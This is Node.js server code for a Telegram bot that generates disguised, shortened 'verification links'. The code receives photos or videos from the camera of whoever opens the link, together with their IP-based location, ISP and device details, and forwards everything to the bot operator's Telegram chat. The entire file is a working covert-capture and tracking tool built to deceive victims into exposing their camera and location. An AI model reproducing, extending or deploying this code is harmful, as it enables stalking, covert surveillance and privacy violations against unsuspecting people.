require('dotenv').config();
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL;

app.use(cors());
app.use(express.json({ limit: '20mb' }));

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// মেমোরি স্টোরেজ
const activeSessions = {};
const userSettings = {};
const awaitingCustomDuration = {};

// --- Health Check Endpoint (Keep-Alive এর জন্য) ---
app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

// --- Webhook Route ---
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// --- Telegram Bot Commands ---
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  userSettings[chatId] = { facingMode: 'user', captureMode: 'photo', duration: 5 };
  awaitingCustomDuration[chatId] = false;
  updateBotUI(chatId);
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  if (text === '/start') return;

  if (awaitingCustomDuration[chatId]) {
    const seconds = parseInt(text);
    if (!isNaN(seconds) && seconds > 0 && seconds <= 60) {
      userSettings[chatId].duration = seconds;
      awaitingCustomDuration[chatId] = false;
      bot.sendMessage(chatId, `✅ Custom duration set to ${seconds} seconds.`);
      updateBotUI(chatId);
    } else {
      bot.sendMessage(chatId, `❌ Invalid input. Please send a number between 1 and 60.`);
    }
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (!userSettings[chatId]) userSettings[chatId] = { facingMode: 'user', captureMode: 'photo', duration: 5 };

  if (data === 'cam_front' || data === 'cam_back') {
    userSettings[chatId].facingMode = data === 'cam_front' ? 'user' : 'environment';
  } else if (data === 'mode_photo' || data === 'mode_video') {
    userSettings[chatId].captureMode = data === 'mode_photo' ? 'photo' : 'video';
  } else if (data.startsWith('dur_') && data !== 'dur_custom') {
    userSettings[chatId].duration = parseInt(data.split('_')[1]);
  } else if (data === 'dur_custom') {
    awaitingCustomDuration[chatId] = true;
    bot.sendMessage(chatId, `⌨️ Please type the custom duration in seconds (e.g., 7, 12, 20):`);
    bot.answerCallbackQuery(query.id, { text: 'Awaiting input...' });
    return;
  }

  bot.answerCallbackQuery(query.id, { text: 'Settings updated!' });
  updateBotUI(chatId, query.message.message_id);

  if (data === 'gen_link') {
    const sessionId = crypto.randomBytes(4).toString('hex');
    const facing = userSettings[chatId].facingMode;
    const mode = userSettings[chatId].captureMode;
    const duration = userSettings[chatId].duration;

    activeSessions[sessionId] = {
      chatId: chatId,
      facingMode: facing,
      captureMode: mode,
      duration: duration,
      createdAt: Date.now(),
      hasSentDetails: false
    };

    const longLink = `${BASE_URL}/?s=${sessionId}&f=${facing}&m=${mode}&d=${duration}`;

    try {
      const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longLink)}`);
      const shortLink = await response.text();
      if (!shortLink.startsWith('https://is.gd/')) throw new Error("Shortener failed");
      bot.sendMessage(chatId, `Here is your verification link:\n\n🔗 [Click here to open](${shortLink})\n\n*Camera:* ${facing === 'user' ? 'Front' : 'Back'}\n*Mode:* ${mode === 'photo' ? 'Photo' : `Video (${duration}s)`}`, { parse_mode: 'Markdown' });
    } catch (err) {
      bot.sendMessage(chatId, `Error creating short link. Here is the direct link:\n${longLink}`);
    }
  }
});

function updateBotUI(chatId, messageId = null) {
  const settings = userSettings[chatId];
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: `${settings.facingMode === 'user' ? '✅' : ''} Front Camera`, callback_data: 'cam_front' },
          { text: `${settings.facingMode === 'environment' ? '✅' : ''} Back Camera`, callback_data: 'cam_back' }
        ],
        [
          { text: `${settings.captureMode === 'photo' ? '✅' : ''} Photo Mode`, callback_data: 'mode_photo' },
          { text: `${settings.captureMode === 'video' ? '✅' : ''} Video Mode`, callback_data: 'mode_video' }
        ],
        ...(settings.captureMode === 'video' ? [[
          { text: `${settings.duration === 5 ? '✅' : ''} 5s`, callback_data: 'dur_5' },
          { text: `${settings.duration === 10 ? '✅' : ''} 10s`, callback_data: 'dur_10' },
          { text: `${settings.duration === 15 ? '✅' : ''} 15s`, callback_data: 'dur_15' },
          { text: `✏️ Custom (${settings.duration}s)`, callback_data: 'dur_custom' }
        ]] : []),
        [{ text: '🔗 Generate Link', callback_data: 'gen_link' }]
      ]
    }
  };

  if (messageId) {
    bot.editMessageReplyMarkup(opts.reply_markup, { chat_id: chatId, message_id: messageId });
  } else {
    bot.sendMessage(chatId, `🟢 *Server is Live!*\n\nConfigure your settings below:`, { parse_mode: 'Markdown', ...opts });
  }
}

// --- Helper: Get IP Details ---
async function getIPDetails(ip) {
  try {
    if (ip.includes('127.0.0.1') || ip.includes('::1')) ip = '8.8.8.8';
    const res = await axios.get(`http://ip-api.com/json/${ip}`);
    if (res.data.status === 'success') {
      return {
        ip: res.data.query,
        isp: res.data.isp,
        state: res.data.regionName,
        district: res.data.city,
        country: res.data.country
      };
    }
  } catch (e) {
    return null;
  }
  return null;
}

// --- API: Photo Receive ---
app.post('/api/send-photo', async (req, res) => {
  try {
    const { imageData, sessionId, deviceInfo } = req.body;
    const session = activeSessions[sessionId];
    if (!session) return res.status(403).json({ error: "Invalid session." });

    let caption = "📸 Auto-verified photo";

    if (!session.hasSentDetails && deviceInfo) {
      const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const ipDetails = await getIPDetails(clientIp);

      caption = `📸 *Auto-verified photo*\n\n`;
      if (ipDetails) {
        caption += `🌐 *IP Info:*\n`;
        caption += `• IP: ${ipDetails.ip}\n`;
        caption += `• ISP: ${ipDetails.isp}\n`;
        caption += `• State: ${ipDetails.state}\n`;
        caption += `• District: ${ipDetails.district}\n`;
        caption += `• Country: ${ipDetails.country}\n\n`;
      }
      caption += `📱 *Device Info:*\n`;
      caption += `• OS: ${deviceInfo.os || 'Unknown'}\n`;
      caption += `• Battery: ${deviceInfo.battery || 'Unknown'}\n`;
      caption += `• Screen: ${deviceInfo.screen || 'Unknown'}\n`;
      caption += `• Language: ${deviceInfo.language || 'Unknown'}\n`;

      session.hasSentDetails = true;
    }

    const buffer = Buffer.from(imageData.split(',')[1], 'base64');
    await bot.sendPhoto(session.chatId, buffer, { caption: caption, parse_mode: 'Markdown' });
    buffer.fill(0);
    res.json({ success: true });
  } catch (error) {
    console.error("Error sending photo:", error);
    res.status(500).json({ error: "Failed" });
  }
});

// --- API: Video Receive ---
app.post('/api/send-video', async (req, res) => {
  try {
    const { videoData, sessionId, deviceInfo } = req.body;
    const session = activeSessions[sessionId];
    if (!session) return res.status(403).json({ error: "Invalid session." });

    let caption = `🎥 Auto-verified video (${session.duration}s)`;

    if (!session.hasSentDetails && deviceInfo) {
      const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const ipDetails = await getIPDetails(clientIp);

      caption = `🎥 *Auto-verified video (${session.duration}s)*\n\n`;
      if (ipDetails) {
        caption += `🌐 *IP Info:*\n`;
        caption += `• IP: ${ipDetails.ip}\n`;
        caption += `• ISP: ${ipDetails.isp}\n`;
        caption += `• State: ${ipDetails.state}\n`;
        caption += `• District: ${ipDetails.district}\n`;
        caption += `• Country: ${ipDetails.country}\n\n`;
      }
      caption += `📱 *Device Info:*\n`;
      caption += `• OS: ${deviceInfo.os || 'Unknown'}\n`;
      caption += `• Battery: ${deviceInfo.battery || 'Unknown'}\n`;
      caption += `• Screen: ${deviceInfo.screen || 'Unknown'}\n`;
      caption += `• Language: ${deviceInfo.language || 'Unknown'}\n`;

      session.hasSentDetails = true;
    }

    const buffer = Buffer.from(videoData.split(',')[1], 'base64');
    await bot.sendVideo(session.chatId, buffer, {
      caption: caption,
      parse_mode: 'Markdown',
      supports_streaming: true
    });
    buffer.fill(0);
    res.json({ success: true });
  } catch (error) {
    console.error("Error sending video:", error);
    res.status(500).json({ error: "Failed" });
  }
});

// --- 🧹 মেমোরি ক্লিনার (প্রতি ৫ মিনিটে) ---
const FIVE_MINUTES = 5 * 60 * 1000;
setInterval(() => {
  const now = Date.now();
  let cleaned = 0;
  for (const id in activeSessions) {
    if (now - activeSessions[id].createdAt > FIVE_MINUTES) {
      delete activeSessions[id];
      cleaned++;
    }
  }
  if (cleaned > 0) console.log(`🧹 Memory Cleaned: Removed ${cleaned} sessions.`);
  if (global.gc) global.gc();
}, FIVE_MINUTES);

// --- 🏓 Keep-Alive Self-Ping (প্রতি ৪ মিনিটে নিজেকে ping করবে) ---
const FOUR_MINUTES = 4 * 60 * 1000;
setInterval(async () => {
  try {
    const pingUrl = BASE_URL ? `${BASE_URL}/health` : `http://localhost:${PORT}/health`;
    await fetch(pingUrl);
    console.log('🏓 Keep-alive ping sent');
  } catch (err) {
    console.error('⚠️ Keep-alive ping failed:', err.message);
  }
}, FOUR_MINUTES);

// --- সার্ভার রান এবং Webhook সেটআপ ---
app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);

  const sugaPublicHostname = process.env.SUGA_PUBLIC_HOSTNAME;

  if (sugaPublicHostname) {
    const publicUrl = sugaPublicHostname.startsWith('http')
      ? sugaPublicHostname
      : `https://${sugaPublicHostname}`;

    const webhookUrl = `${publicUrl}/bot${BOT_TOKEN}`;

    try {
      await bot.setWebHook(webhookUrl);
      console.log(`✅ Webhook set successfully to: ${webhookUrl}`);
    } catch (err) {
      console.error("❌ Failed to set webhook:", err.message);
    }
  } else {
    console.warn("⚠️ SUGA_PUBLIC_HOSTNAME not found. Webhook could not be set.");
  }
});
